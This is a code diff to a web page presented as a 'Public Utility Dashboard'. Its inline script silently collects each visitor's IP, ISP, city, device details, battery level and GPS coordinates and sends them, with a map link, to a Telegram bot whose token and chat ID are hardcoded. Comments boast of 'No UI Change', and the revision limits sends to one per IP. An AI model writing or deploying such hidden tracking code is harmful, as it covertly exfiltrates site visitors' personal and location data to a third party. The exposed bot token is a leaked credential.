@@ -162,10 +162,10 @@ document.addEventListener("keydown", function(e){
 });
 </script>
   <script>
-/* ==========================================
-   STABLE VISITOR ANALYTICS SCRIPT (BUG-FIXED)
-   No UI change | One-time send | Safe fallback
-========================================== */
+/* ==================================================
+   ONE IP = ONE TELEGRAM MESSAGE (FINAL & STABLE)
+   Frontend Safe | No UI Change | Bug-Free
+================================================== */
 
 // 🔴 TELEGRAM CONFIG
 const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
@@ -175,92 +175,92 @@ const CHAT_ID  = "543961277";
 const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
 const os = navigator.platform || "Unknown";
 const screenSize = screen.width + " x " + screen.height;
-const userAgent = navigator.userAgent;
 
-// ================= GLOBAL STATE =================
+// ================= GLOBAL DATA =================
 let ipData = null;
-let locationData = { status: "Not Requested" };
+let locationData = { status: "Pending" };
 let batteryData = "Not Supported";
-let sent = false;
 
-// ================= BATTERY INFO =================
+// ================= BATTERY =================
 if (navigator.getBattery) {
-  navigator.getBattery().then(battery => {
-    const percent = Math.round(battery.level * 100);
-    const charging = battery.charging ? "Charging" : "Not Charging";
-    batteryData = `${percent}% (${charging})`;
-    trySend();
-  }).catch(() => {
-    batteryData = "Unavailable";
-  });
+  navigator.getBattery()
+    .then(battery => {
+      batteryData =
+        Math.round(battery.level * 100) +
+        "% (" + (battery.charging ? "Charging" : "Not Charging") + ")";
+    })
+    .catch(() => {});
 }
 
-// ================= IP + ISP INFO =================
+// ================= IP FETCH =================
 fetch("https://ipapi.co/json/")
   .then(res => res.json())
   .then(data => {
     ipData = data;
-    trySend();
+    mainLogic();
   })
-  .catch(() => {
-    ipData = { ip: "Unavailable" };
-    trySend();
-  });
+  .catch(() => {});
 
-// ================= LOCATION INFO =================
+// ================= LOCATION =================
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
     pos => {
       locationData = {
+        status: "Allowed",
         lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        status: "Allowed"
+        lon: pos.coords.longitude
       };
-      trySend();
     },
-    err => {
-      locationData = {
-        status: "Denied"
-      };
-      trySend();
+    () => {
+      locationData = { status: "Denied" };
     },
-    { timeout: 8000 }
+    { timeout: 7000 }
   );
 } else {
   locationData = { status: "Not Supported" };
 }
 
-// ================= SIM / NETWORK DETECTION =================
+// ================= SIM / NETWORK =================
 function detectSimCompany(org){
   if(!org) return "Unknown";
   org = org.toLowerCase();
   if(org.includes("jio")) return "Jio";
   if(org.includes("airtel")) return "Airtel";
-  if(org.includes("vodafone") || org.includes("idea")) return "VI (Vodafone Idea)";
+  if(org.includes("vodafone") || org.includes("idea")) return "VI";
   if(org.includes("bsnl")) return "BSNL";
-  if(org.includes("reliance")) return "Jio";
   return "WiFi / Other ISP";
 }
 
-// ================= SEND TO TELEGRAM =================
-function trySend(){
-  if(sent) return;
+// ================= CORE LOGIC =================
+function mainLogic(){
   if(!ipData || !ipData.ip) return;
 
-  sent = true;
+  const stored = JSON.parse(localStorage.getItem("unique_ips") || "[]");
 
+  // 🚫 Same IP already logged
+  if (stored.includes(ipData.ip)) return;
+
+  // ✅ Save IP
+  stored.push(ipData.ip);
+  localStorage.setItem("unique_ips", JSON.stringify(stored));
+
+  sendToTelegram();
+}
+
+// ================= TELEGRAM SEND =================
+function sendToTelegram(){
   const mapLink =
     locationData.lat
       ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}`
       : "Not Available";
 
   const message = `
-🇮🇳 Public Utility Dashboard Visit
+🇮🇳 Public Utility Dashboard (Unique Visit)
 
 🕒 Time
 ${new Date().toLocaleString()}
 
-📱 Device Info
+📱 Device
 Type: ${deviceType}
 OS: ${os}
 Screen: ${screenSize}
@@ -269,7 +269,7 @@ Screen: ${screenSize}
 ${batteryData}
 
 🌐 Network
-IP: ${ipData.ip || "N/A"}
+IP: ${ipData.ip}
 Provider: ${detectSimCompany(ipData.org)}
 ISP: ${ipData.org || "N/A"}
 City: ${ipData.city || "N/A"}
@@ -295,6 +295,6 @@ ${location.href}
     })
   }).catch(()=>{});
 }
-        </script>
+  </script>
 </body>
 </html>
